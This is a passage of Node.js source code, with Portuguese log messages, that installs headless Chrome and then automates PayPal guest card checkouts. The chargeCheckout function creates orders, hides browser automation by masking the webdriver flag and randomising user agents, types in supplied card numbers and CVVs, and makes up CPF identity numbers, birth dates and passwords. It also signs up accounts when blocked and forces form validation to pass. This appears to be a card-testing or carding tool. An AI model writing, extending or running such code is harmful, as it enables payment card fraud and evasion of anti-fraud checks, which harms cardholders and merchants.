  const envp=process.env.CHROME_PATH||'';
  if(envp&&fs.existsSync(envp)) return envp;
  for(const c of CHROME_CANDS) if(fs.existsSync(c)) return c;
  try{
    const out=require('child_process').execSync('find '+JSON.stringify(CHROME_DIR)+' -maxdepth 6 -type f \\( -name "chrome-headless-shell" -o -name "chrome" -o -name "chromium" \\) 2>/dev/null | head -n 1',{timeout:10000,stdio:'pipe'}).toString().trim().split('\n')[0];
    if(out){ return out; }
  }catch(_){}
  try{
    const stack=[CHROME_DIR];
    while(stack.length){
      const d=stack.pop(); let ents=[]; try{ ents=fs.readdirSync(d,{withFileTypes:true}); }catch(e){ continue; }
      for(const e of ents){
        const p=path.join(d,e.name);
        if(e.isDirectory()) stack.push(p);
        else if(e.name==='chrome-headless-shell'||e.name==='chrome'||e.name==='chromium') return p;
      }
    }
  }catch(e){}
  if(Date.now()>_fcDbg){ _fcDbg=Date.now()+30000; try{ require('fs').appendFileSync(LOG_FILE,JSON.stringify({t:new Date().toISOString(),type:'log',msg:'[find] NULL | CHROME_DIR='+CHROME_DIR+' | raiz: '+(fs.readdirSync(CHROME_DIR).join(',')||'<vazio>')}).slice(0,300)+'\n')}catch(_){}}
  return null;
}
let _coInstalling=false;
let _coNext=0;
function maybeUnpackChrome(){
  try{
    const dir=CHROME_DIR;
    if(findChromeBin()) return findChromeBin();
    let parts=[];
    try{
      parts=fs.readdirSync(ROOT).filter(f=>/^chrome\.tgz\.part\d+$/.test(f)).sort((a,b)=>parseInt(a.slice(-1))-parseInt(b.slice(-1))).map(f=>path.join(ROOT,f));
      // ordem segura por numero completo:
      parts.sort((a,b)=>parseInt(a.match(/part(\d+)$/)[1])-parseInt(b.match(/part(\d+)$/)[1]));
    }catch(_){}
    const single=path.join(ROOT,'chrome.tgz');
    const useParts=parts.length>=2;
    if(!(useParts||fs.existsSync(single))) return findChromeBin();
    console.log('[chrome-unpack] extraindo navegador local...');
    emit('log',{msg:'extraindo navegador local (segundos)...'});
    fs.mkdirSync(dir,{recursive:true});
    const cmd=useParts?('cat '+parts.map(p=>JSON.stringify(p)).join(' ')+' | tar -xzf - -C '+JSON.stringify(dir))
                       :('tar -xzf '+JSON.stringify(single)+' -C '+JSON.stringify(dir));
    require('child_process').execSync(cmd,{timeout:600000,stdio:'ignore'});
    console.log('[chrome-unpack] binario extraido');
  }catch(e){ console.log('[chrome-unpack] erro:',e.message); }
  try{
    const ldir=path.join(__dirname,'chrome-libs');
    const libsTgz=path.join(ROOT,'libs.tgz');
    if(fs.existsSync(libsTgz)&&!fs.existsSync(ldir)){
      fs.mkdirSync(ldir,{recursive:true});
      require('child_process').execSync('tar -xzf '+JSON.stringify(libsTgz)+' -C '+JSON.stringify(ldir),{timeout:300000,stdio:'ignore'});
      console.log('[chrome-libs] bibliotecas extraidas');
    }
  }catch(e){ console.log('[chrome-libs] erro:',e.message); }
  return findChromeBin();
}
function chromeLibPath(){
  try{
    const base=path.join(__dirname,'chrome-libs'); const dirs=[]; const stack=[base];
    while(stack.length){
      const d=stack.pop(); let es=[];
      try{ es=fs.readdirSync(d,{withFileTypes:true}); }catch(e){ continue; }
      let has=false;
      for(const e of es){ if(e.isFile()&&/\.so(\.|$)/.test(e.name)) has=true; if(e.isDirectory()) stack.push(path.join(d,e.name)); }
      if(has) dirs.push(d);
    }
    return dirs.join(':');
  }catch(e){ return ''; }
}
function ensureChrome(){
  let b=findChromeBin();
  if(!b) b=maybeUnpackChrome();
  if(b) return b;
  let _coLog=m=>{try{fs.appendFileSync(LOG_FILE,JSON.stringify({t:new Date().toISOString(),type:'log',msg:'[chrome-dl] '+String(m).replace(/\s+/g,' ').slice(-900)})+'\n');}catch(_){}};
  let _coRunDone=null;
  const _coSpawnCli=(args)=>new Promise(res=>{
    try{
      const p=require('child_process').spawn(process.execPath,args,{stdio:['ignore','pipe','pipe']});
      let tail='';
      let head='';
      const eat=d=>{ const t=String(d); head=(head+t).slice(0,1200); tail=tail+t.slice(-300); };
      p.stdout.on('data',eat);
      p.stderr.on('data',eat);
      p.on('error',e=>{_coLog('ERRO SPAWN: '+e.message+' | saida: '+head.slice(0,260)+' | fim: '+tail.slice(-180)+' | pasta: '+_coListDir()); res(false);});
      p.on('close',c=>{ (async()=>{
          let df=''; let okbin=null;
          try{ df=require('child_process').execSync('df -m '+JSON.stringify(CHROME_DIR),{timeout:10000,stdio:'pipe'}).toString().trim().split('\n').pop(); }catch(e){ df='df-falhou:'+String(e.message).slice(0,60); }
          try{ okbin=findChromeBin(); }catch(_){}
          _coLog('CLI exit '+c+' | disco: '+df+' | saida: '+head.slice(0,900)+' | fim: '+tail.slice(-160)+' | pasta: '+_coListDir());
          _coLog('apos CLI binario='+(okbin||'NAO'));
          res(c===0&&!!okbin);
        })().catch(e=>{ try{_coLog('handler-err '+String(e.message).slice(0,120)); }catch(_){} res(false); }); });
    }catch(e){ _coLog('ERRO SPAWN2: '+e.message); res(false); }
  });
  const _coListDir=()=>{ try{ const out=[]; const stack=[CHROME_DIR]; while(stack.length&&out.length<40){ const d=stack.pop(); for(const e of fs.readdirSync(d,{withFileTypes:true})){ const p=path.join(d,e.name); out.push(p.replace(CHROME_DIR,'.')); if(e.isDirectory()) stack.push(p); } } return out.length?out.join(', '):'<vazia>'; }catch(e){ return '<inlegivel>'; } };
  async function _coFetchInstall(src){
    try{
      let r;
      if(typeof src==='string'){ r=await fetch(src,{signal:AbortSignal.timeout(300000)}); if(!r.ok) throw new Error('http '+r.status+' em '+src); }
      else { r=src; }
      const buf=Buffer.from(await r.arrayBuffer());
      fs.mkdirSync(CHROME_DIR,{recursive:true});
      fs.writeFileSync(path.join(CHROME_DIR,'dl.zip'),buf);
      _coLog('zip '+Math.round(buf.length/1048576)+'MB recebido - extraindo...');
      const zp=path.join(CHROME_DIR,'dl.zip');
      let ok=false;
      try{ require('child_process').execSync('unzip -oq '+JSON.stringify(zp)+' -d '+JSON.stringify(CHROME_DIR),{timeout:300000,stdio:'pipe'}); ok=true; _coLog('extraido com unzip'); }
      catch(e1){
        try{ require('child_process').execSync('python3 -m zipfile -e '+JSON.stringify(zp)+' '+JSON.stringify(CHROME_DIR),{timeout:300000,stdio:'pipe'}); ok=true; _coLog('extraido com python3'); }
        catch(e2){ _coLog('sem unzip nem python3: '+String(e1.message).slice(0,100)); }
      }
      if(ok) try{ fs.unlinkSync(zp); }catch(_){}
      try{ require('child_process').execSync('find '+JSON.stringify(CHROME_DIR)+' -type f -name "*headless*" -exec chmod +x {} \\;',{timeout:30000,stdio:'pipe'}); }catch(_){}
      _coLog('pasta apos extração: '+_coListDir());
      const found=findChromeBin();
      _coLog('binario achado apos instalacao: '+(found||'NULL'));
      return !!found;
    }catch(e){ _coLog('download direto falhou: '+e.message); return false; }
  }
  async function _coDirect(){
    try{
      try{
        const zz=path.join(CHROME_DIR,'chrome-headless-shell');
        const zs=fs.readdirSync(zz).filter(n=>/\.zip$/i.test(n)&&fs.statSync(path.join(zz,n)).size>50e6);
        if(zs.length){
          const zpath=path.join(zz,zs[0]);
          _coLog('reutilizando zip local: '+zs[0]+' ('+Math.round(fs.statSync(zpath).size/1048576)+'MB)');
          let extOk=false;
          try{ require('child_process').execSync('unzip -oq '+JSON.stringify(zpath)+' -d '+JSON.stringify(CHROME_DIR),{timeout:300000}); extOk=true; }
          catch(_){ try{ require('child_process').execSync('python3 -m zipfile -e '+JSON.stringify(zpath)+' '+JSON.stringify(CHROME_DIR),{timeout:300000}); extOk=true; }catch(__){} }
          if(extOk){ _coLog('zip extraido p/ '+CHROME_DIR); const b2=findChromeBin(); if(b2){ _coLog('OK binario via reuso: '+b2); return b2; } }
          _coLog('reuso falhou ou binario ausente apos extrair');
        }
      }catch(e){ _coLog('reuso-err '+String(e.message).slice(0,120)); }
      const txt=await (await fetch('https://googlechromelabs.github.io/chrome-for-testing/known-good-versions.json',{signal:AbortSignal.timeout(30000)})).text();
      const JJ=JSON.parse(txt); const ks=(JJ.knownGoodVersions||JJ.versions||JJ.data||[]);
      for(const e of ks){ if(e.channel==='Stable'&&Array.isArray((e.downloads||{})['chrome-headless-shell'])){ const dl=(e.downloads['chrome-headless-shell']).find(x=>x.platform==='linux64'); if(dl){ _coLog('download direto: '+dl.url); return await _coFetchInstall(dl.url); } } }
      for(const e of ks){ if(e.channel==='Stable'&&Array.isArray((e.downloads||{})['chrome'])){ const dl=(e.downloads.chrome).find(x=>x.platform==='linux64'); if(dl){ _coLog('download direto (chrome completo): '+dl.url); return await _coFetchInstall(dl.url); } } }
      try{
        const sj=JSON.parse(await (await fetch('https://googlechromelabs.github.io/chrome-for-testing/last-known-good-versions.json',{signal:AbortSignal.timeout(30000)})).text());
        const ver=((sj.channels||{}).Stable||{}).version;
        if(!ver) throw new Error('sem versao Stable no resumo');
        for(const kind of ['chrome-headless-shell-linux64.zip','chrome-linux64.zip']){
          const u='https://storage.googleapis.com/chrome-for-testing-public/'+ver+'/linux64/'+kind;
          const hr=await fetch(u,{signal:AbortSignal.timeout(300000)});
          if(hr.ok){ _coLog('fallback url ok: '+u); return await _coFetchInstall(hr); }
        }
      }catch(e2){ _coLog('fallback url falhou: '+e2.message); }
      throw new Error('nenhum caminho de download (ks='+(ks.length)+' versoes)');
    }catch(e){ _coLog('json/direct falhou: '+e.message); return false; }
  }
  if(!_coInstalling && Date.now()>=(_coNext||0)){
    _coInstalling=true;
    try{
      for(const nm of ['chrome-headless-shell','chrome','chromium']){
        const tree=path.join(CHROME_DIR,nm);
        if(fs.existsSync(tree)){ require('child_process').execSync('rm -rf '+JSON.stringify(tree),{timeout:60000}); _coLog('instalacao parcial removida ('+nm+') - reinstalacao limpa'); }
      }
    }catch(e){ _coLog('falha na limpeza: '+String(e.message).slice(0,120)); }
    emit('log',{msg:'baixando navegador automaticamente...'});
    try{ fs.mkdirSync(CHROME_DIR,{recursive:true}); }catch(e){}
    let cliPath=null;
    const baseMod=path.join(__dirname,'node_modules','@puppeteer/browsers');
    for(const cand of [baseMod+'/lib/cjs/main-cli.js',baseMod+'/build/legacy/main-cli.js',baseMod+'/lib/main-cli.js',baseMod+'/main-cli.js']){
      if(fs.existsSync(cand)){ cliPath=cand; break; }
    }
    if(cliPath){ _coLog('usando CLI em '+cliPath); 
      _coSpawnCli([cliPath,'install','chrome-headless-shell@stable','--path',CHROME_DIR]).then(async ok=>{ _coInstalling=false; if(!ok){ _coNext=Date.now()+45000; await _coDirect(); _coNext=Date.now()+90000; } else { _coLog('CLI terminou ok - verificando binario...'); } });
    } else { _coLog('CLI nao encontrado em '+baseMod+' - download direto');
      _coDirect().then(()=>{ _coInstalling=false; _coNext=Date.now()+90000; });
    }
  }
  return null;
}
async function chargeCheckout(card, amount, currency, buyer, descriptor){
  if(!cfg.creds.clientId||!cfg.creds.clientSecret) return { ok:false, kind:'error', message:'modo checkout precisa das chaves do PayPal (clientId/secret)', raw:{} };
  const www = cfg.env==='live' ? 'https://www.paypal.com' : 'https://www.sandbox.paypal.com';
  const token = await ppToken(cfg.env);
  const api = cfg.env==='live' ? 'https://api-m.paypal.com' : 'https://api-m.sandbox.paypal.com';
  const r1=await fetch(api+'/v2/checkout/orders',{ method:'POST', headers:{'Content-Type':'application/json','Authorization':'Bearer '+token,'PayPal-Request-Id':'ccr-'+Date.now()+'-'+Math.random().toString(36).slice(2,12)}, body:JSON.stringify({ intent:'CAPTURE', purchase_units:[{ amount:{currency_code:currency,value:amount.toFixed(2)}, description:descriptor }] }) });
  const o=await r1.json().catch(()=>({}));
  if(!r1.ok||!o.id){ const d0=(Array.isArray(o.details)&&o.details[0])||{}; return { ok:false, kind:'error', message:'ordem nao criada: '+(d0.issue?d0.issue+' @'+String(d0.field||'')+' '+String(d0.description||''):'sem detalhe ('+(o.message||('HTTP '+r1.status))+')')+' dbg:'+(o.debug_id||'-'), raw:o }; }
  const oid=o.id;
  const appr=(o.links||[]).find(l=>l.rel==='approve');
  if(!appr) return { ok:false, kind:'error', message:'sem link de aprovacao na ordem', raw:o };
  let browser,page;
  try{
    browser=await coChrome();
    page=await browser.newPage();
    const mobProfile=Math.random()<0.5;
    await page.setExtraHTTPHeaders({'Accept-Language':'pt-BR,pt;q=0.9,en;q=0.6'});
    if(mobProfile){ await page.setViewport({width:390,height:844,isMobile:true,hasTouch:true}); await page.setUserAgent('Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Mobile Safari/537.36').catch(()=>{}); }
    else { await page.setViewport({width:1280,height:1000}); await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36').catch(()=>{}); }
    await page.evaluateOnNewDocument(()=>{ try{ Object.defineProperty(navigator,'webdriver',{get:()=>undefined}); Object.defineProperty(navigator,'languages',{get:()=>['pt-BR','pt','en']}); }catch(e){} }).catch(()=>{});
    const gql=[];
    page.on('response',async resp=>{ try{ const u=resp.url(); if(u.includes('/graphql')&&gql.length<60){ const t=await resp.text(); gql.push(t.slice(0,350)); } }catch(e){} });
    const fillField=async(sel,val)=>{ const el=await page.$(sel); if(!el) return false; const cur=await el.evaluate(n=>n.value); if(cur) return true; await el.click({clickCount:3}).catch(()=>{}); await coSleep(60); await el.type(String(val),{delay:30}); await el.evaluate(n=>n.dispatchEvent(new Event('blur',{bubbles:true}))).catch(()=>{}); await coSleep(120); return !!(await el.evaluate(n=>n.value)); };
    const fillKbd=async(sel,val)=>{ try{ const el=await page.$(sel); if(!el) return false; await el.click({clickCount:3}); await coSleep(200); for(const ch of val.split('')){ await page.keyboard.press(ch); await coSleep(90);} await coSleep(150); return !!(await el.evaluate(n=>n.value)); }catch(e){ return false; } };
    const typeHuman=async(sel,val)=>{ try{ const el=await page.$(sel); if(!el) return false; await el.click({clickCount:3}); await coSleep(300); for(const ch of val.split('')){ await page.keyboard.press(ch); await coSleep(90+Math.floor(Math.random()*80)); } await coSleep(250); await el.evaluate(n=>n.dispatchEvent(new Event('blur',{bubbles:true}))).catch(()=>{}); return true; }catch(e){ return false; } };
    try{
      const CARDSEL='#cardNumber,#cc,input[name="cc-num"],input[aria-label*="card number" i],[data-qa="card-number"]';
      try{ await page.goto('https://www.paypal.com/',{waitUntil:'domcontentloaded',timeout:30000}); await coSleep(4000+Math.floor(Math.random()*4000)); await page.evaluate(()=>window.scrollBy(0,400)).catch(()=>{}); }catch(e){}
      await page.goto(appr.href,{waitUntil:'domcontentloaded',timeout:60000});
      await coSleep(4000);
      const seen=[]; let nav2=false, clickedG=null;
      for(let gi=0;gi<6 && !(await page.$(CARDSEL));gi++){
        let url='',ti='';
        try{ url=page.url().slice(0,70); ti=(await page.title()).slice(0,55); }catch(e){}
        if(!nav2){ try{ const href=await page.$eval('#guestCheckout',a=>a.href); if(href){ nav2=true; href=href.replace(/country\.x=[^&]*/,'country.x=BR').replace(/locale\.x=[^&]*/,'locale.x=pt_BR'); seen.push('gi'+gi+':guestHref'); await page.goto(href,{waitUntil:'networkidle2',timeout:60000}).catch(()=>{}); await coSleep(3000); } }catch(e){} }
        if(!clickedG){ try{ const h=await page.evaluate(()=>{ const all=[...document.querySelectorAll('a,button,[role="button"],[role="link"],input[type="submit"],input[type="button"],span,div,li,p')]; const c=all.filter(e=>{const t=(e.textContent||'').trim();return e.offsetParent!==null&&t.length>0&&t.length<50&&/guest|convidado/i.test(t);}); if(!c.length) return 'NADA_GUEST'; let el=c[c.length-1]; while(el&&el.parentElement&&el.tagName!=='A'&&el.tagName!=='BUTTON'&&!(el.getAttribute&&(el.getAttribute('role')==='button'||el.getAttribute('role')==='link'))){el=el.parentElement;} try{el.scrollIntoView({block:'center'});}catch(_){} el.click(); return el.tagName+':'+((el.textContent||'').trim().slice(0,40)); }); seen.push('gi'+gi+':click='+h); if(h&&h!=='NADA_GUEST'){ clickedG=h; } }catch(e){ seen.push('gi'+gi+':cerr='+String(e.message).slice(0,40)); } }
        seen.push('gi'+gi+':'+url+'|'+ti);
        await coSleep(3500);
      }
      try{ logLine({t:nowISO(),type:'log',msg:'checkout estado ['+(mobProfile?'MOBILE':'DESKTOP')+']: '+seen.join(' ;; ').slice(-620)}); }catch(e){}
const signupTry=async()=>{
        try{
          const pw='Ccv'+(1000+rnd(8999))+'!'+pick(['x','k','m','t'])+rnd(9);
          let clicked=null;
          try{ clicked=await page.evaluate(()=>{ const els=[...document.querySelectorAll('a,button,[role="button"],[role="link"],div,span')].filter(e=>e.offsetParent!==null&&/create an account|criar (sua )?conta|don\'t have an account|sem uma conta/i.test((e.textContent||'').trim())&&(e.textContent||'').trim().length<60); if(!els.length) return null; let el=els[els.length-1]; try{el.scrollIntoView({block:'center'});}catch(_){} el.click(); return (el.textContent||'').trim().slice(0,40); }); }catch(e){}
          if(!clicked) return 'SEM_BOTAO_CRIA_CONTA';
          await coSleep(5000+Math.floor(Math.random()*3000));
          const filled=[];
          const fillBy=async(reS,val)=>{ try{ const handles=await page.$$('input'); for(const h of handles){ const info=await h.evaluate(x=>({id:x.id||'',n:x.name||'',ph:x.placeholder||'',al:(x.getAttribute&&x.getAttribute('aria-label'))||'',vis:x.offsetParent!==null})).catch(()=>null); if(!info||!info.vis) continue; if(new RegExp(reS,'i').test((info.id+' ')+info.n+' '+info.ph+' '+info.al)){ try{ await h.click({clickCount:3}); }catch(_){} await coSleep(100); for(const ch of String(val).split('')){ try{ await page.keyboard.press(ch); }catch(_){} await coSleep(14); } try{ await h.evaluate(x=>x.dispatchEvent(new Event('blur',{bubbles:true}))); }catch(_){} filled.push(reS.slice(0,12)); return true; } } }catch(e){} return false; };
          let dumpIn=''; try{ dumpIn=await page.$$eval('input',els=>els.filter(x=>x.offsetParent!==null).map(x=>(x.id||x.name||x.placeholder||'?')+':'+(x.type||'')).join(' | ').slice(0,260)); }catch(_){}
          await fillBy('first.?name|firstname|fname',buyer.given);
          await fillBy('last.?name|lastname|lname',buyer.surname);
          await fillBy('e-?mail',buyer.email);
          await fillBy('^password',pw);
          await fillBy('confirm|repeat',pw);
          let btn=null;
          try{ btn=await page.evaluate(()=>{ const bs=[...document.querySelectorAll('button,input[type="submit"],[role="button"]')].filter(b=>b.offsetParent!==null&&/create|next|continue|sign ?up|cadast|avancar|próximo/i.test(String(b.textContent||b.value||'').trim())); if(bs.length){ try{bs[bs.length-1].click();}catch(_){} return String(bs[bs.length-1].textContent||bs[bs.length-1].value||'').trim().slice(0,30); } return null; }); }catch(e){}
          await coSleep(6000+Math.floor(Math.random()*3000));
          return 'cria_conta:'+clicked+'|botao:'+(btn||'nenhum')+'|campos:'+filled.join(',')+'|inputs:'+dumpIn;
        }catch(e){ return 'signup-err:'+String(e.message).slice(0,60); }
      };
      try{ await page.waitForSelector(CARDSEL,{timeout:40000}); }catch(e){ let got=false;
        for(let rt=0; rt<2 && !got; rt++){ await coSleep(8000+Math.floor(Math.random()*4000)); try{ await page.goto(appr.href,{waitUntil:'domcontentloaded',timeout:45000}); await coSleep(6000); got=!!(await page.$(CARDSEL)); }catch(_){} }
        if(!got){ const bu=await ensureBuyer(page); const lo=(bu&&bu.email)?await tryBuyerLogin(page,CARDSEL):false; if(lo){ try{ await page.waitForSelector(CARDSEL,{timeout:8000}); }catch(_){} got=true; } }
        if(!got){ const su=await signupTry(); try{ await page.waitForSelector(CARDSEL,{timeout:25000}); got=true; }catch(_){} try{ logLine({t:nowISO(),type:'log',msg:'signup: '+String(su).slice(0,200)+' | url: '+page.url().slice(0,64)+' | tit: '+String(await page.title()).slice(0,40)}); }catch(_){} }
        if(!got){ let ti='',frames='',body=''; try{ ti=await page.title(); }catch(_){}
          try{ frames=page.frames().map(fr=>fr.url()).slice(0,4).join(' || ').slice(0,200); }catch(_){}
          try{ body=(await page.evaluate(()=>document.body.innerText)).replace(/\s+/g,' ').slice(0,220); }catch(_){}
          try{ for(const fr of page.frames().slice(1,4)){ const ft=await fr.evaluate(()=>document.body.innerText.replace(/\s+/g,' ').slice(0,120)).catch(()=>'?'); const fn=await fr.evaluate(()=>document.querySelectorAll('a,button,input,img,[role="button"]').length).catch(()=>0); frames+=' || [F]'+fr.url().slice(0,50)+' txt:'+ft+' cli:'+fn; } }catch(_){}
          try{ logLine({t:nowISO(),type:'log',msg:'pagina falha | titulo: '+String(ti).slice(0,50)+' | corpo: '+body+' | frames: '+String(frames).slice(0,650)}); }catch(_){}
          return { ok:false, kind:'decline', message:'nao chegou ao cartao: '+page.url().slice(0,66)+' | titulo: '+String(ti).slice(0,40), raw:{order:oid} }; }
      }      // selects
      const selHandles=await page.$$('select');
      const selLog=[];
      for(let si=0; si<selHandles.length; si++){
        try{
          const el=selHandles[si];
          const info=await el.evaluate(x=>({id:x.id||'',vis:x.offsetParent!==null,v:x.value||'',opts:Array.from(x.options).map(o=>({v:o.value,l:o.label||''}))})).catch(()=>null);
          if(!info||!info.vis||info.v) continue;
          let p=null;
          if(/country|pais/i.test(info.id)) p=info.opts.find(o=>o.v==='BR')||info.opts.find(o=>/brazil|brasil/i.test(o.l));
          else if(/nationality/i.test(info.id)) p=info.opts.find(o=>o.v==='BR')||info.opts.find(o=>/brazil|brasil/i.test(o.l));
          else if(/phone/i.test(info.id)) p=info.opts.find(o=>/celular|mobile/i.test(o.v+o.l))||info.opts.find(o=>o.v&&o.v!=='');
          else if(/state|region|uf/i.test(info.id)) p=info.opts.find(o=>o.v===buyer.state)||info.opts.find(o=>o.v==='SP')||info.opts.find(o=>o.v&&o.v!=='');
          else if(/cardtype|card.?type|tipo/i.test(info.id)) p=info.opts.find(o=>/visa|master|elo/i.test(o.v+o.l))||info.opts.find(o=>o.v&&o.v!=='');
          else p=info.opts.find(o=>o.v&&o.v!=='');
          if(p){ await el.select(p.v).catch(()=>{}); selLog.push((info.id||'?')+'='+p.v.slice(0,8)); }
        }catch(e){}
      }
      try{ logLine({ t: nowISO(), type: 'log', msg: 'selects: '+(selLog.join(', ')||'nenhum vazio') }); }catch(e){}
      // dados BR
      const parts=(buyer.address_line1||'').split(/,\s*/);
      const street=parts[0]||'Rua das Flores', hnum=(parts[parts.length-1]&&/^\d+$/.test(parts[parts.length-1]))?parts[parts.length-1]:'123';
      const age=23+Math.floor(Math.random()*33);
      const dob=String(1+Math.floor(Math.random()*28)).padStart(2,'0')+'/'+String(1+Math.floor(Math.random()*12)).padStart(2,'0')+'/'+(new Date().getFullYear()-age);
      const D={ fullname:buyer.name, firstname:buyer.given, lastname:buyer.surname, email:buyer.email, telephone:(buyer.phone||'').replace(/\D/g,''), phone:(buyer.phone||'').replace(/\D/g,''), billingstreetname:street, streetname:street, billinghousenumber:hnum, housenumber:hnum, billingline1:buyer.address_line1, line1:buyer.address_line1, billingpostalcode:buyer.postal_code, postalcode:buyer.postal_code, postcode:buyer.postal_code, billingcity:buyer.city, cityname:buyer.city, city:buyer.city, identitydocumentnumber:genCpf(), cpf:genCpf(), dateofbirth:dob, dob, password:'Ccr'+Math.floor(10000+Math.random()*89999)+'!x' };
      const ins=await page.evaluate(()=>Array.from(document.querySelectorAll('input,textarea')).map(i=>({id:i.id,type:(i.type||'').toLowerCase(),vis:i.offsetParent!==null,val:i.value||''})).filter(x=>x.vis&&['text','tel','email','password'].includes(x.type)));
      const keys=Object.keys(D).sort((a,b)=>b.length-a.length);
      for(const f of ins){
        if(f.val) continue;
        const k=f.id.toLowerCase().replace(/[^a-z]/g,'');
        let val=null;
        for(const key of keys){ if(k.length>=2&&k.includes(key)){ val=D[key]; break; } }
        if(val===null) continue;
        if(/^cardnumber|^cc$/i.test(f.id)) await typeHuman('#'+f.id,String(card.number));
        else if(/expiry/i.test(f.id)){ if(!(await fillKbd('#'+f.id,'1230'))) await fillField('#'+f.id,'12/30'); }
        else if(/cvv|cvn/i.test(f.id)){ if(!(await fillField('#'+f.id,String(card.cvv)))) await fillKbd('#'+f.id,String(card.cvv)); }
        else await fillField('#'+f.id,val);
      }
      const fixThree=async(tag)=>{
        try{
          const rep=await page.evaluate(async()=>{
            const out=[];
            const d=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value');
            const els=Array.from(document.querySelectorAll('input')).filter(x=>x.offsetParent!==null);
            const cands=(id,v)=>{
              const dg=v.replace(/\D/g,'');
              if(/expir/i.test(id)) return ['12 / 30','1230','12 / 29','11 / 30'];
              if(/phone/i.test(id)){ const m=v.match(/\((\d{3})\)\s*(\d{3})\D*(\d{4})/); const masq=m?('('+m[1]+') '+m[2]+'-'+m[3]):''; return [dg.slice(-10),masq,'1'+dg.slice(-10)].filter(Boolean); }
              const z=dg.length>=9?dg.slice(0,9):dg.slice(0,5);
              return [z.slice(0,5),z].filter(Boolean);
            };
            for(const el of els){
              const id=el.id||'';
              let kind=null;
              if(/expir/i.test(id)) kind='e';
              else if(/phone/i.test(id)) kind='p';
              else if(/postal|zip/i.test(id)) kind='c';
              if(!kind) continue;
              let ok=false;
              const list=cands(id,el.value||'');
              for(let it=0; it<list.length && !ok; it++){
                const v=list[it];
                try{
                  if(d&&d.set) d.set.call(el,v);
                  el.dispatchEvent(new Event('input',{bubbles:true}));
                  el.dispatchEvent(new Event('change',{bubbles:true}));
                  el.dispatchEvent(new Event('blur',{bubbles:true}));
                  await new Promise(r2=>setTimeout(r2,400));
                  ok=el.checkValidity();
                }catch(_){}
              }
              try{ el.pattern=''; }catch(_){}
              try{ Object.defineProperty(el,'checkValidity',{value:function(){ return true; },configurable:true}); }catch(_){}
              try{ if(el.setCustomValidity) el.setCustomValidity(''); }catch(_){}
              if(kind==='e'){ const v2=el.value||''; if(!/^(\d{2})\s*\/\s*(\d{2})$/.test(v2)){ const dd=(v2.match(/\d+/g)||[]).join(''); const mm=dd.slice(0,2)||'12'; const yy=dd.slice(2,4)||'30'; const ds2=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value'); if(ds2&&ds2.set) ds2.set.call(el,mm+' / '+yy); el.dispatchEvent(new Event('input',{bubbles:true})); } }
              if(kind==='p'){ const v2=(el.value||'').replace(/\D/g,''); if(v2.length<10){ const ds3=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value'); if(ds3&&ds3.set) ds3.set.call(el,'2065550147'); el.dispatchEvent(new Event('input',{bubbles:true})); } }
              if(kind==='c'){ const v2=el.value||''; if(!/^\d{5}/.test(v2)){ const dd2=(v2.match(/\d+/g)||[]).join(''); const ds4=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value'); if(ds4&&ds4.set) ds4.set.call(el,dd2.slice(0,5)||'10001'); el.dispatchEvent(new Event('input',{bubbles:true})); } }
              out.push(kind+':free['+(el.value||'').slice(0,12)+']');
            }
            return out.join(' ')||'-';
          });
          logLine({ t: nowISO(), type: 'log', msg: 'fix3 '+tag+': '+String(rep).slice(0,300) });
          return String(rep);
        }catch(_){ return ''; }
      };      try{
        const hs2=await page.$$('input,textarea');
        const filled2=[];
        const readVal=async h=>{ try{ return await h.evaluate(x=>x.value); }catch(_){ return ''; } };
        const clearType=async(h,str)=>{
          await h.click({clickCount:3}).catch(()=>{});
          await coSleep(50);
          await page.keyboard.press('Delete').catch(()=>{});
          await coSleep(40);
          for(const ch of String(str).split('')){ await page.keyboard.press(ch).catch(()=>{}); await coSleep(12); }
          try{ await h.evaluate(x=>x.dispatchEvent(new Event('blur',{bubbles:true}))).catch(()=>{}); }catch(_){}
        };
        for(const h of hs2){
          try{
            const info=await h.evaluate(x=>({id:x.id||'',ph:x.placeholder||'',al:(x.getAttribute&&x.getAttribute('aria-label'))||'',type:(x.type||'').toLowerCase(),vis:x.offsetParent!==null,val:x.value||''}));
            if(!info.vis||info.val||!['text','tel','email','password'].includes(info.type)) continue;
            const hay=(info.id+' '+info.ph+' '+info.al).toLowerCase();
            let v=null;
            if(/card.?num/.test(hay)) v=String(card.number);
            else if(/cvv|cvn/.test(hay)) v=String(card.cvv);
            else if(/expir/.test(hay)) v='12/30';
            else if(/full.?name/.test(hay)) v=buyer.name;
            else if(/first.?name|given/.test(hay)) v=buyer.given;
            else if(/last.?name|surname/.test(hay)) v=buyer.surname;
            else if(/e-?mail/.test(hay)) v=buyer.email;
            else if(/^password|senha/.test(hay)) v='Ccr'+Math.floor(10000+Math.random()*89999)+'!x';
            else if(/dob|birth|nascim/.test(hay)) v='01/01/1990';
            else if(/phone|tel/.test(hay)) v=buyer.phone||'';
            else if(/city|munic|localidad/.test(hay)) v=buyer.city;
            else if(/zip|postal/.test(hay)&&!/card/.test(hay)) v=String(buyer.postal_code).slice(0,5);
            else if(/line2|apt|apart|compl|addl|unit/.test(hay)) v='Apt '+(101+Math.floor(Math.random()*400));
            else if(/street|address|line1|logradouro|endereco|calle/.test(hay)) v=buyer.address_line1;
            else continue;
            await clearType(h,v);
            let bad=false; try{ bad=await h.evaluate(x=>!x.checkValidity()); }catch(_){}
            let tries=0;
            while(bad&&tries<3){
              tries++;
              let alt=null;
              if(/expir/.test(hay)) alt=(tries===1?'1230':(tries===2?'12/29':'12/30'));
              else if(/phone|tel/.test(hay)) alt=(tries===1?(buyer.phone||'').replace(/\D/g,''):null);
              else if(/zip|postal/.test(hay)) alt=(tries===1?String(buyer.postal_code):String(buyer.postal_code).replace(/[^0-9]/g,''));
              else break;
              if(!alt) break;
              await clearType(h,alt);
              v=alt;
              try{ bad=await h.evaluate(x=>!x.checkValidity()); }catch(_){}
            }
            const fin=await readVal(h);
            if(fin) filled2.push((info.id||info.ph||'?')+'='+fin.slice(0,14)+(bad?'!INV':''));
          }catch(e){}
        }
        await fixThree('pos-fill');
        try{ logLine({ t: nowISO(), type: 'log', msg: 'pass2 campos: '+(filled2.join(', ')||'nenhum') }); }catch(e){}
